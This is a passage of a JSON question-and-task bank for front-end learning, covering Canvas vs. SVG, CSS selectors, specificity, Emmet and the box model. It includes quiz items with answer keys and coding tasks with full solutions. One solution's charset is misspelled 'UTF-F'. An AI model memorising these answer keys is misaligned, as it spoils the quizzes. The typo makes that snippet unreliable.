          "example": "SVG is vector-based, meaning it defines graphics using mathematical descriptions of shapes. This makes it inherently resolution-independent, so it scales perfectly without pixelation, making it ideal for logos and illustrations. The other options (games, image filters, particle systems) involve frequent pixel manipulation or very numerous, rapidly changing elements, which are generally better suited for Canvas's pixel-based, high-performance rendering capabilities.",
          "tags": [
            "Canvas",
            "SVG",
            "Comparison",
            "Graphics",
            "Medium"
          ],
          "prerequisites": [
            "theory_canvas_vs_svg"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_canvas_vs_svg_flashcard_1",
          "topic": "Canvas vs. SVG - Key Differences",
          "level": "easy",
          "type": "flashcard",
          "question": "Is HTML Canvas resolution-dependent or resolution-independent?",
          "answer": "Resolution-dependent (pixel-based)",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "Canvas",
            "Resolution",
            "Pixel-based"
          ],
          "evaluationCriteria": [
            "Recall of Canvas characteristics"
          ],
          "example": "",
          "tags": [
            "Canvas",
            "SVG",
            "Flashcard",
            "Comparison"
          ],
          "prerequisites": [
            "theory_canvas_vs_svg"
          ],
          "complexity": 2,
          "interviewFrequency": 7,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_selectors_mcq_1",
          "topic": "CSS Basic Selectors",
          "level": "easy",
          "type": "mcq",
          "question": "Given the following HTML structure:\n\n```html\n<div class=\"container\">\n  <p id=\"first-para\" class=\"text-block\">\n    This is the first paragraph.\n  </p>\n  <span class=\"text-block\">\n    A span element.\n  </span>\n</div>\n```\n\nWhich CSS selector would correctly target *only* the `<p>` element?",
          "answer": "#first-para",
          "options": [
            ".text-block",
            "div p",
            "#first-para",
            "span"
          ],
          "analysisPoints": [
            "Understands the uniqueness of ID selectors.",
            "Differentiates between ID, class, and type selectors.",
            "Recognizes that descendant selectors might match more than intended if not specific enough."
          ],
          "keyConcepts": [
            "CSS Selectors",
            "ID Selector",
            "Class Selector",
            "Type Selector",
            "Specificity"
          ],
          "evaluationCriteria": [
            "Ability to choose the most specific selector for a single element.",
            "Understanding of selector specificity hierarchy."
          ],
          "example": "The `#first-para` selector specifically targets the element with the ID `first-para`. While `.text-block` would also select the `span`, and `div p` would select the paragraph, `#first-para` is the most direct and unique way to select *only* that specific paragraph given its ID. The `span` selector would target the `span` element, not the `p`.",
          "tags": [
            "CSS",
            "Selectors",
            "Easy"
          ],
          "prerequisites": [
            "HTML_Elements",
            "theory_css_selectors"
          ],
          "complexity": 3,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        },
        {
          "id": "question_css_selectors_mcq_2",
          "topic": "CSS Attribute Selectors",
          "level": "medium",
          "type": "mcq",
          "question": "Which CSS selector would you use to style all `<a>` (anchor) tags whose `href` attribute value contains the string 'example.com' anywhere within it?",
          "answer": "a[href*=\"example.com\"]",
          "options": [
            "a[href=\"example.com\"]",
            "a[href^=\"example.com\"]",
            "a[href~=\"example.com\"]",
            "a[href*=\"example.com\"]"
          ],
          "analysisPoints": [
            "Understands the different types of attribute selectors.",
            "Specifically identifies the 'contains substring' attribute selector.",
            "Distinguishes `*=` from `=`, `^=`, and `~=`."
          ],
          "keyConcepts": [
            "CSS Attribute Selectors",
            "Substring Matching",
            "Selector Syntax"
          ],
          "evaluationCriteria": [
            "Precise knowledge of attribute selector syntax.",
            "Ability to apply the correct selector for a given matching condition."
          ],
          "example": "The `*=` operator in attribute selectors (`[attr*=\"value\"]`) is used to match elements where the attribute's value contains the specified substring anywhere within it. `a[href=\"example.com\"]` would only match an exact value. `a[href^=\"example.com\"]` would only match if it starts with 'example.com'. `a[href~=\"example.com\"]` would match if 'example.com' is a whole word in a space-separated list within the attribute, which is not applicable for a URL.",
          "tags": [
            "CSS",
            "Selectors",
            "Attribute Selectors",
            "Medium"
          ],
          "prerequisites": [
            "theory_css_selectors"
          ],
          "complexity": 5,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_selectors_open_1",
          "topic": "CSS Combinators",
          "level": "medium",
          "type": "open",
          "question": "Explain the difference between the CSS descendant selector (`div span`) and the child selector (`div > span`). Provide a simple HTML example and demonstrate how each selector would apply styles.",
          "answer": "The CSS descendant selector (space) and child selector (>) both define relationships between elements, but with different levels of strictness regarding nesting.\n\n**1. Descendant Selector (space): `div span`**\n*   **Meaning:** Selects all `<span>` elements that are descendants of a `<div>` element, regardless of how many levels deep the `<span>` is nested within the `<div>`.\n*   **Flexibility:** It's more flexible and will match elements at any level of nesting within the parent.\n\n**2. Child Selector (>): `div > span`**\n*   **Meaning:** Selects all `<span>` elements that are *direct children* of a `<div>` element. It will only match if the `<span>` is immediately nested one level inside the `<div>`.\n*   **Strictness:** It's stricter and only matches immediate children.\n\n**HTML Example:**\n```html\n<div class=\"parent\">\n  <span>Direct Child Span 1</span>\n  <p>\n    <span>Nested Grandchild Span</span>\n  </p>\n  <span>Direct Child Span 2</span>\n</div>\n<span>Outside Div Span</span>\n```\n\n**CSS Application:**\n```css\n/* Descendant Selector */\n.parent span {\n  color: blue; /* Applies to: 'Direct Child Span 1', 'Nested Grandchild Span', 'Direct Child Span 2' */\n}\n\n/* Child Selector */\n.parent > span {\n  font-weight: bold; /* Applies only to: 'Direct Child Span 1', 'Direct Child Span 2' */\n}\n```\n\n**Explanation of Application:**\n*   The `.parent span` selector would make \"Direct Child Span 1\", \"Nested Grandchild Span\", and \"Direct Child Span 2\" all blue, because all three are descendants of the element with class `parent`.\n*   The `.parent > span` selector would make only \"Direct Child Span 1\" and \"Direct Child Span 2\" bold, because they are direct children of the element with class `parent`. The \"Nested Grandchild Span\" is a descendant but not a direct child (it's a child of `<p>`, which is a child of `div.parent`), so it would not be affected by the child selector.",
          "options": [],
          "analysisPoints": [
            "Clearly defines both descendant and child selectors.",
            "Provides an accurate HTML example to illustrate the difference.",
            "Correctly predicts which elements would be selected by each CSS rule.",
            "Emphasizes the concept of 'direct child' vs 'any descendant'."
          ],
          "keyConcepts": [
            "CSS Combinators",
            "Descendant Selector",
            "Child Selector",
            "Nesting",
            "Specificity"
          ],
          "evaluationCriteria": [
            "Accuracy of definitions.",
            "Effectiveness of example in demonstrating the concepts.",
            "Completeness of explanation."
          ],
          "example": "",
          "tags": [
            "CSS",
            "Selectors",
            "Combinators",
            "Open-Ended"
          ],
          "prerequisites": [
            "theory_css_selectors"
          ],
          "complexity": 6,
          "interviewFrequency": 8,
          "learningPath": "intermediate"
        },
        {
          "id": "question_css_selectors_flashcard_1",
          "topic": "CSS Selector Types",
          "level": "easy",
          "type": "flashcard",
          "question": "What is the primary difference in selection behavior between a class selector (`.myClass`) and an ID selector (`#myID`)?",
          "answer": "A class selector can target multiple elements, while an ID selector should uniquely target only one element on a page.",
          "options": [],
          "analysisPoints": [],
          "keyConcepts": [
            "CSS Selectors",
            "Class Selector",
            "ID Selector",
            "Uniqueness"
          ],
          "evaluationCriteria": [
            "Recall of basic selector properties"
          ],
          "example": "",
          "tags": [
            "CSS",
            "Flashcard",
            "Selectors"
          ],
          "prerequisites": [
            "theory_css_selectors"
          ],
          "complexity": 3,
          "interviewFrequency": 9,
          "learningPath": "beginner"
        }
      ],
      "tasks": [
        {
          "id": "task_canvas_simple_animation",
          "title": "Create a Bouncing Ball Animation on Canvas",
          "description": "\nImplement a simple bouncing ball animation within an HTML Canvas. The ball should move diagonally across the canvas and bounce off the edges.\n\n**Requirements:**\n1.  Initialize an HTML Canvas element with a visible size (e.g., 600x400 pixels).\n2.  Draw a circular ball on the canvas.\n3.  Implement animation logic using `requestAnimationFrame`.\n4.  The ball should move at a constant speed (e.g., 5 pixels per frame in both X and Y directions).\n5.  When the ball hits any of the four canvas edges, its corresponding velocity component (dx or dy) should reverse direction, making it 'bounce'.\n6.  Clear the canvas in each animation frame before redrawing.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Bouncing Ball</title>\n    <style>\n        body {\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            background-color: #f0f0f0;\n            margin: 0;\n        }\n        canvas {\n            border: 2px solid #333;\n            background-color: #fff;\n        }\n    </style>\n</head>\n<body>\n    <canvas id=\"bouncingBallCanvas\" width=\"600\" height=\"400\"></canvas>\n\n    <script>\n        const canvas = document.getElementById('bouncingBallCanvas');\n        const ctx = canvas.getContext('2d');\n\n        // Ball properties\n        let ballX = 50;\n        let ballY = 50;\n        let ballRadius = 20;\n        let ballColor = 'red';\n\n        // Ball velocity\n        let dx = 5; // X velocity\n        let dy = 5; // Y velocity\n\n        function drawBall() {\n            ctx.beginPath();\n            ctx.arc(ballX, ballY, ballRadius, 0, Math.PI * 2);\n            ctx.fillStyle = ballColor;\n            ctx.fill();\n            ctx.closePath();\n        }\n\n        function update() {\n            // TODO: Clear the canvas\n            // TODO: Update ball position (ballX, ballY) based on dx, dy\n            // TODO: Implement bouncing logic for X-axis (left/right walls)\n            // TODO: Implement bouncing logic for Y-axis (top/bottom walls)\n\n            // TODO: Redraw the ball\n\n            // TODO: Request next animation frame\n        }\n\n        // Start the animation\n        // TODO: Call update() to begin the animation loop\n\n    </script>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Bouncing Ball</title>\n    <style>\n        body {\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            min-height: 100vh;\n            background-color: #f0f0f0;\n            margin: 0;\n        }\n        canvas {\n            border: 2px solid #333;\n            background-color: #fff;\n        }\n    </style>\n</head>\n<body>\n    <canvas id=\"bouncingBallCanvas\" width=\"600\" height=\"400\"></canvas>\n\n    <script>\n        const canvas = document.getElementById('bouncingBallCanvas');\n        const ctx = canvas.getContext('2d');\n\n        // Ball properties\n        let ballX = 50;\n        let ballY = 50;\n        const ballRadius = 20;\n        const ballColor = 'red';\n\n        // Ball velocity\n        let dx = 5; // X velocity\n        let dy = 5; // Y velocity\n\n        function drawBall() {\n            ctx.beginPath();\n            ctx.arc(ballX, ballY, ballRadius, 0, Math.PI * 2);\n            ctx.fillStyle = ballColor;\n            ctx.fill();\n            ctx.closePath();\n        }\n\n        function update() {\n            // 1. Clear the canvas\n            ctx.clearRect(0, 0, canvas.width, canvas.height);\n\n            // 2. Update ball position\n            ballX += dx;\n            ballY += dy;\n\n            // 3. Implement bouncing logic for X-axis\n            // If ball hits left or right wall\n            if (ballX + ballRadius > canvas.width || ballX - ballRadius < 0) {\n                dx = -dx; // Reverse X direction\n            }\n\n            // 4. Implement bouncing logic for Y-axis\n            // If ball hits top or bottom wall\n            if (ballY + ballRadius > canvas.height || ballY - ballRadius < 0) {\n                dy = -dy; // Reverse Y direction\n            }\n\n            // 5. Redraw the ball at its new position\n            drawBall();\n\n            // 6. Request next animation frame\n            requestAnimationFrame(update);\n        }\n\n        // Start the animation\n        update();\n    </script>\n</body>\n</html>\n",
          "testCases": [
            "Ball should move across the canvas.",
            "Ball should correctly reverse X-direction when hitting left/right edges (consider ball radius).",
            "Ball should correctly reverse Y-direction when hitting top/bottom edges (consider ball radius).",
            "Animation should be smooth and continuous using `requestAnimationFrame`.",
            "Canvas should be cleared in each frame, preventing trails."
          ],
          "hints": [
            "Remember to account for the `ballRadius` when checking for collisions with the canvas edges.",
            "`ctx.clearRect(0, 0, canvas.width, canvas.height);` is the most common way to clear the entire canvas.",
            "Use `requestAnimationFrame(update);` as the last line in your `update` function to create the loop."
          ],
          "tags": [
            "Canvas",
            "Animation",
            "Physics",
            "JavaScript",
            "Front-end"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "theory_canvas_fundamentals"
          ],
          "complexity": 6,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "Game_Development_Basics",
            "Event_Loop",
            "Performance_Optimization"
          ]
        },
        {
          "id": "task_css_selector_targeting",
          "title": "Apply Styles Using Specific CSS Selectors",
          "description": "\nGiven a complex HTML structure, write CSS rules using various selectors (including attribute selectors and combinators) to achieve specific styling goals. You need to demonstrate precision in your selector choices.\n\n**Requirements:**\n1.  Make all direct `<li>` children of an `<ul>` with the class `main-menu` have a blue text color.\n2.  Apply a `border: 1px solid green;` to any `<div>` element that has a `data-status` attribute with the exact value 'active'.\n3.  Change the `font-style` to `italic` for any `<em>` element that is a descendant of a `<section>` element.\n4.  Add a red background to any `<a>` element whose `href` attribute value ends with `.pdf`.\n5.  Give `padding: 5px;` to all elements, except those with the class `no-padding`.\n",
          "difficulty": "medium",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>CSS Selectors Task</title>\n    <style>\n        /* Your CSS Rules Here */\n\n    </style>\n</head>\n<body>\n    <header>\n        <h1>Welcome</h1>\n        <ul class=\"main-menu\">\n            <li><a href=\"#home\">Home</a></li>\n            <li>\n                <a href=\"#products\">Products</a>\n                <ul>\n                    <li>Sub-item 1</li>\n                    <li>Sub-item 2</li>\n                </ul>\n            </li>\n            <li><a href=\"#contact\">Contact</a></li>\n        </ul>\n        <ul class=\"secondary-menu\">\n            <li>Help</li>\n        </ul>\n    </header>\n\n    <main>\n        <section>\n            <p>This is a paragraph with <em>important</em> text.</p>\n            <div>\n                Another div with <em>more emphasis</em>.\n            </div>\n        </section>\n\n        <div data-status=\"active\">\n            Active Status Div\n        </div>\n        <div data-status=\"inactive\">\n            Inactive Status Div\n        </div>\n        <div data-mode=\"dark\">\n            Dark Mode Div\n        </div>\n\n        <a href=\"/docs/report.pdf\">Download Report</a>\n        <a href=\"/pages/about.html\">About Us</a>\n\n        <p class=\"no-padding\">This paragraph should not have padding.</p>\n        <span class=\"no-padding\">This span should also not have padding.</span>\n\n    </main>\n\n    <footer>\n        &copy; 2023\n    </footer>\n</body>\n</html>\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-F\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>CSS Selectors Task</title>\n    <style>\n        /* 1. Make all direct `<li>` children of an `<ul>` with the class `main-menu` have a blue text color. */\n        .main-menu > li {\n            color: blue;\n        }\n\n        /* 2. Apply a `border: 1px solid green;` to any `<div>` element that has a `data-status` attribute with the exact value 'active'. */\n        div[data-status=\"active\"] {\n            border: 1px solid green;\n        }\n\n        /* 3. Change the `font-style` to `italic` for any `<em>` element that is a descendant of a `<section>` element. */\n        section em {\n            font-style: italic;\n        }\n\n        /* 4. Add a red background to any `<a>` element whose `href` attribute value ends with `.pdf`. */\n        a[href$=\".pdf\"] {\n            background-color: red;\n            color: white; /* For readability */\n            padding: 2px 5px;\n            display: inline-block;\n        }\n\n        /* 5. Give `padding: 5px;` to all elements, except those with the class `no-padding`. */\n        * {\n            padding: 5px;\n        }\n\n        .no-padding {\n            padding: 0; /* Override the universal padding */\n        }\n    </style>\n</head>\n<body>\n    <header>\n        <h1>Welcome</h1>\n        <ul class=\"main-menu\">\n            <li><a href=\"#home\">Home</a></li>\n            <li>\n                <a href=\"#products\">Products</a>\n                <ul>\n                    <li>Sub-item 1</li>\n                    <li>Sub-item 2</li>\n                </ul>\n            </li>\n            <li><a href=\"#contact\">Contact</a></li>\n        </ul>\n        <ul class=\"secondary-menu\">\n            <li>Help</li>\n        </ul>\n    </header>\n\n    <main>\n        <section>\n            <p>This is a paragraph with <em>important</em> text.</p>\n            <div>\n                Another div with <em>more emphasis</em>.\n            </div>\n        </section>\n\n        <div data-status=\"active\">\n            Active Status Div\n        </div>\n        <div data-status=\"inactive\">\n            Inactive Status Div\n        </div>\n        <div data-mode=\"dark\">\n            Dark Mode Div\n        </div>\n\n        <a href=\"/docs/report.pdf\">Download Report</a>\n        <a href=\"/pages/about.html\">About Us</a>\n\n        <p class=\"no-padding\">This paragraph should not have padding.</p>\n        <span class=\"no-padding\">This span should also not have padding.</span>\n\n    </main>\n\n    <footer>\n        &copy; 2023\n    </footer>\n</body>\n</html>\n",
          "testCases": [
            "Direct `<li>` children of `.main-menu` should be blue, but `<li>` elements within the nested `<ul>` (Sub-item 1, Sub-item 2) should NOT be blue.",
            "The `div[data-status=\"active\"]` should have a green border, but `div[data-status=\"inactive\"]` and `div[data-mode=\"dark\"]` should not.",
            "Both `<em>` tags within the `<section>` (one in `<p>`, one in `<div>`) should be italic.",
            "The 'Download Report' link should have a red background, but 'About Us' should not.",
            "All elements should have 5px padding, EXCEPT the paragraph and span with `class=\"no-padding\"` should have 0 padding."
          ],
          "hints": [
            "For direct children, use the child combinator (`>`).",
            "For attribute exact value matching, use `[attr=\"value\"]`.",
            "For descendant elements, use the descendant combinator (space).",
            "For attribute values ending with a specific string, use `[attr$=\"value\"]`.",
            "To apply a style to almost all elements but exclude a few, you can use the universal selector (`*`) for the general rule and then a more specific selector with `padding: 0;` (or whatever style) to override it for the excluded elements, leveraging CSS specificity."
          ],
          "tags": [
            "CSS",
            "Selectors",
            "Specificity",
            "HTML",
            "Frontend"
          ],
          "timeEstimate": 30,
          "prerequisites": [
            "theory_css_selectors"
          ],
          "complexity": 5,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "CSS_Specificity",
            "DOM_Structure",
            "Maintainable_CSS"
          ]
        }
      ]
    }
  },
  {
    "id": "3eac5140-5d9e-44ed-a769-0fd09c50ab37",
    "startLine": 11700,
    "endLine": 11799,
    "processedDate": "2025-06-17T12:35:42.618Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_css_selectors",
          "title": "CSS Selectors and Combinators",
          "content": "CSS selectors are patterns used to select and style HTML elements. They allow developers to target specific elements, groups of elements, or elements based on their state or position within the document.\n\n## Type Selectors\nThese select elements by their HTML tag name, e.g., `div` selects all `<div>` elements.\n\n## Combinators\nCombinators explain the relationship between the selectors. The markdown provided specifically mentions the Adjacent Sibling Selector.\n\n- **Adjacent Sibling Selector (`+`):** Selects an element that is immediately preceded by another specified element. It only selects the *next* sibling.\n\n## Pseudo-classes\nPseudo-classes are used to define a special state of an element. They are denoted by a single colon (`:`).\n\n- `:hover`: Selects an element when the user's mouse pointer is over it.\n- `:focus`: Selects an element that has received focus (e.g., an input field when clicked).\n- `:first-child`: Selects an element that is the first child of its parent.\n- `:last-child`: Selects an element that is the last child of its parent.\n- `:nth-child(n)`: Selects elements based on their position among a group of siblings. `n` can be a number, a keyword (like `odd`, `even`), or a formula (like `2n` for even, `2n+1` for odd, `3n` for every third). `2n` selects every even-numbered element.\n\n## Pseudo-elements\nPseudo-elements are used to style a specific part of an element. They are denoted by a double colon (`::`).\n\n- `::first-line`: Selects the first line of a block-level element.\n- `::first-letter`: Selects the first letter of a block-level element.\n- `::before`: Inserts content before the actual content of an element. This content is inline by default and requires the `content` property.\n- `::after`: Inserts content after the actual content of an element. Similar to `::before`, it requires the `content` property.\n\n## Combining Selectors\nSelectors can be combined to create more specific rules.\n\n- **Multiple Classes (`.class1.class2`):** Selects an element that has *all* the specified classes.\n- **Element with Class (`element.class`):** Selects a specific type of element that also has a particular class.",
          "examples": [
            {
              "id": "example_css_selectors_1",
              "title": "Adjacent Sibling Selector",
              "code": "/* HTML */\n<a href=\"#\">Link</a>\n<p>This paragraph will be styled because it immediately follows an 'a' tag.</p>\n<p>This paragraph will not be styled.</p>\n\n/* CSS */\na + p {\n  color: blue;\n  font-weight: bold;\n}",
              "explanation": "This example demonstrates the adjacent sibling selector. Only the first paragraph element that directly follows an `<a>` element will have its text color changed to blue and made bold.",
              "language": "css"
            },
            {
              "id": "example_css_selectors_2",
              "title": "Pseudo-classes and Pseudo-elements",
              "code": "/* HTML */\n<input type=\"text\" placeholder=\"Focus me\">\n<ul>\n  <li>Item 1</li>\n  <li>Item 2</li>\n  <li>Item 3</li>\n</ul>\n<p>This is a paragraph with multiple lines. The first line and first letter will be styled.</p>\n<div class=\"important\">Important Content</div>\n\n/* CSS */\ninput:focus {\n  border: 2px solid green;\n}\nli:nth-child(2n) {\n  background-color: #f0f0f0;\n}\np::first-line {\n  text-transform: uppercase;\n}\np::first-letter {\n  font-size: 2em;\n  color: red;\n}\ndiv.important::before {\n  content: \"Note: \";\n  font-weight: bold;\n  color: purple;\n}",
              "explanation": "This example shows various pseudo-classes and pseudo-elements. The input field gets a green border on focus. Even-numbered list items get a light gray background. The first line of the paragraph becomes uppercase, and its first letter is larger and red. Finally, the `::before` pseudo-element adds 'Note: ' in bold purple before the content of `div.important`.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Selectors",
            "Pseudo-classes",
            "Pseudo-elements",
            "Combinators"
          ],
          "technology": "CSS",
          "prerequisites": [
            "HTML_structure"
          ],
          "complexity": 5,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "advanced_css_layouts",
            "responsive_design"
          ]
        },
        {
          "id": "theory_css_specificity",
          "title": "CSS Selector Specificity",
          "content": "CSS specificity is the algorithm browsers use to determine which CSS declaration applies to an element when multiple rules could apply. It's essentially a scoring system, and the rule with the highest score wins.\n\nWhen competing rules target the same element, specificity calculates which rule's declaration is most relevant and should be applied. A more specific selector will override a less specific one.\n\n## Specificity Hierarchy (from lowest to highest):\n\n1.  **Type selectors** (`div`, `h1`) and **Pseudo-elements** (`::before`, `::after`): These have the lowest specificity score.\n    *Example: `p { color: red; }`*\n\n2.  **Class selectors** (`.example`), **Attribute selectors** (`[type=\"radio\"]`), and **Pseudo-classes** (`:hover`, `:nth-child`): These have a higher specificity than type selectors.\n    *Example: `.my-class { color: blue; }`*\n\n3.  **ID selectors** (`#example`): These are very specific and have a higher score than classes and attributes.\n    *Example: `#my-id { color: green; }`*\n\n4.  **Inline styles** (`style=\"\"` attribute): Styles applied directly to an HTML element using the `style` attribute have the highest specificity score (unless `!important` is used).\n    *Example: `<p style=\"color: purple;\">Content</p>`*\n\n5.  **`!important` declaration**: This is not part of the standard specificity calculation but acts as an override. When `!important` is used on a property, it overrides *all* other declarations, regardless of specificity, unless another declaration also uses `!important` (in which case, standard specificity rules apply among the `!important` declarations, or the last one declared wins if specificity is equal). Its use is generally discouraged as it makes debugging and maintaining CSS difficult.\n\n## Specificity Calculation Rules:\nSpecificity is often represented as four comma-separated numbers (a, b, c, d):\n- **a**: 1 if the declaration is an inline style, 0 otherwise.\n- **b**: Number of ID selectors.\n- **c**: Number of class selectors, attribute selectors, and pseudo-classes.\n- **d**: Number of type selectors and pseudo-elements.\n\nExample: `a + p` would have a specificity of (0, 0, 0, 2) because it involves two type selectors. `.container.dark` would have (0, 0, 2, 0) as it uses two class selectors.",
          "examples": [
            {
              "id": "example_css_specificity_1",
              "title": "Specificity in Action",
              "code": "/* HTML */\n<style>\n  #myId { color: red; }\n  .myClass { color: blue; }\n  p { color: green; }\n</style>\n<p id=\"myId\" class=\"myClass\">What color will I be?</p>\n\n/* CSS (implicit order) */\n/* The color will be red because #myId (0,1,0,0) > .myClass (0,0,1,0) > p (0,0,0,1) */",
              "explanation": "In this example, the paragraph has an ID, a class, and is a type selector. The `#myId` rule will apply because ID selectors have higher specificity than class or type selectors, resulting in red text.",
              "language": "css"
            },
            {
              "id": "example_css_specificity_2",
              "title": "Specificity with !important",
              "code": "/* HTML */\n<style>\n  p { color: red !important; }\n  .highlight { color: blue; }\n</style>\n<p class=\"highlight\">What color will I be?</p>\n\n/* CSS (implicit order) */\n/* The color will be red because !important overrides the .highlight class */",
              "explanation": "Here, even though `.highlight` has a higher specificity than `p` (class vs. type selector), the `!important` declaration on `color: red;` overrides the `blue` color, making the text red. This demonstrates the powerful override nature of `!important`.",
              "language": "css"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "CSS",
            "Specificity",
            "Selectors",
            "Styling",
            "Cascading"
          ],
          "technology": "CSS",
          "prerequisites": [
            "css_selectors"
          ],
          "complexity": 7,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "requiredFor": [
            "debugging_css",
            "maintainable_css"
          ]
        },
        {
          "id": "theory_emmet",
          "title": "Emmet for Rapid HTML/CSS Development",
          "content": "Emmet (formerly Zen Coding) is a set of plugins for text editors that significantly improves HTML and CSS workflow. It allows developers to write code much faster using a shorthand syntax that expands into full HTML tags or CSS properties. It's particularly useful for creating boilerplate structures and repetitive elements quickly.\n\n## Key Features:\n\n- **Shorthand Syntax:** A concise way to describe the structure of HTML or CSS.\n- **Expansion:** The shorthand expands into full, well-formed code.\n- **Tab Triggers:** Typically activated by pressing `Tab` or `Ctrl+E` after typing the shorthand.\n\n## HTML Shorthand Examples:\n\n- `div` -> `<div></div>`\n- `p.text` -> `<p class=\"text\"></p>`\n- `ul#list>li.item*3` ->\n  ```html\n  <ul id=\"list\">\n    <li class=\"item\"></li>\n    <li class=\"item\"></li>\n    <li class=\"item\"></li>\n  </ul>\n  ```\n- `a[href=\"/home\"]{Home}` -> `<a href=\"/home\">Home</a>`\n\n## Common Emmet Operators:\n\n- `>`: Child (nested element)\n- `+`: Sibling (element at the same level)\n- `^`: Climb up (moves up one level in the hierarchy)\n- `*N`: Multiplication (repeats an element N times)\n- `#id`: ID attribute\n- `.class`: Class attribute\n- `[attr=value]`: Attribute with value\n- `{text}`: Text content\n- `$`: Numbering (for repeated items, e.g., `li.item$*3` -> `li.item1`, `li.item2`, `li.item3`)\n\nEmmet significantly reduces repetitive typing, making frontend development more efficient.",
          "examples": [
            {
              "id": "example_emmet_1",
              "title": "Emmet Navbar Example",
              "code": "/* Emmet shorthand: */\n.navbar>ul.nav.navbar-nav>li*5>a[href=\"/\"]\n\n/* Expands to: */\n<div class=\"navbar\">\n  <ul class=\"nav navbar-nav\">\n    <li><a href=\"/\"></a></li>\n    <li><a href=\"/\"></a></li>\n    <li><a href=\"/\"></a></li>\n    <li><a href=\"/\"></a></li>\n    <li><a href=\"/\"></a></li>\n  </ul>\n</div>",
              "explanation": "This is the example provided in the markdown, demonstrating how a concise Emmet shorthand can generate a complex nested HTML structure for a navigation bar, including multiple list items and anchor tags with an attribute.",
              "language": "html"
            },
            {
              "id": "example_emmet_2",
              "title": "More Emmet HTML Shorthands",
              "code": "/* Emmet shorthand: */\nheader+main.content>h1{Page Title}+p{Welcome to the page.}^footer>p{Copyright 2023}\n\n/* Expands to: */\n<header></header>\n<main class=\"content\">\n  <h1>Page Title</h1>\n  <p>Welcome to the page.</p>\n</main>\n<footer>\n  <p>Copyright 2023</p>\n</footer>",
              "explanation": "This example shows the use of sibling (`+`), child (`>`), text content (`{}`), and climb up (`^`) operators to generate a common page structure with header, main content, and footer. The `^` operator is crucial for moving back up the DOM tree to add `footer` as a sibling of `main`, rather than a child of `main`.",
              "language": "html"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "Emmet",
            "Productivity",
            "HTML",
            "CSS",
            "Developer Tools"
          ],
          "technology": "HTML",
          "prerequisites": [
            "html_basics",
            "css_basics"
          ],
          "complexity": 4,
          "interviewRelevance": 7,
          "learningPath": "beginner",
          "requiredFor": [
            "rapid_prototyping",
            "code_efficiency"
          ]
        },
        {
          "id": "theory_box_model",
          "title": "The CSS Box Model",
          "content": "The CSS Box Model is a fundamental concept in web design. It describes how HTML elements are rendered as rectangular boxes, with each box comprising four layers: content, padding, border, and margin.\n\n## Components of the Box Model:\n\n1.  **Content Box:** This is where the actual content of the element (text, images, video, etc.) resides. Its dimensions are determined by the `width` and `height` properties.\n\n2.  **Padding Box:** This is the transparent area surrounding the content. It provides space between the content and the border. Padding can be set using `padding`, `padding-top`, `padding-right`, `padding-bottom`, `padding-left`.\n\n3.  **Border Box:** The border encloses the padding and content. It's the visible line around the element. Border properties include `border`, `border-width`, `border-style`, `border-color`, and individual sides (`border-top`, etc.).\n\n4.  **Margin Box:** This is the transparent area outside the border. It creates space between the element's border and other adjacent elements. Margins can be set using `margin`, `margin-top`, `margin-right`, `margin-bottom`, `margin-left`.\n\n## `box-sizing` Property:\n\nBy default, the `box-sizing` property is set to `content-box`. This means:\n\n- `width` and `height` properties only apply to the **content box**.\n- Any `padding` and `border` you add will *increase* the total width and height of the element.\n\nFor example, if `width: 300px`, `padding: 20px`, and `border: 5px`, the total width will be `300px (content) + 2*20px (padding) + 2*5px (border) = 350px`.\n\nTo make sizing more intuitive, the `box-sizing: border-box` value is widely used. With `border-box`:\n\n- `width` and `height` properties include the **padding** and **border**.\n- The content area shrinks to accommodate the padding and border, but the total width/height remains what you specified.\n\nUsing `box-sizing: border-box` makes it easier to design layouts because you don't have to constantly calculate the total dimensions of elements that have padding and borders.",
          "examples": [
            {
              "id": "example_box_model_1",
              "title": "Box Model with content-box (Default)",
              "code": "/* HTML */\n<div class=\"box content-box-example\">Content</div>\n\n/* CSS */\n.content-box-example {\n  width: 100px;\n  height: 100px;\n  padding: 10px;\n  border: 5px solid black;\n  margin: 10px;\n  background-color: lightblue;\n  /* box-sizing: content-box; (This is the default, so not strictly needed) */\n}\n\n/* Calculated total width: 100px (content) + 2*10px (padding) + 2*5px (border) = 130px */\n/* Calculated total height: 100px (content) + 2*10px (padding) + 2*5px (border) = 130px */",
              "explanation": "This example shows the default `content-box` behavior. The `width` and `height` apply only to the content area. The total space occupied by the element will be larger than the specified `width` and `height` due to added padding and border.",
              "language": "css"
            },
            {
              "id": "example_box_model_2",
              "title": "Box Model with border-box",
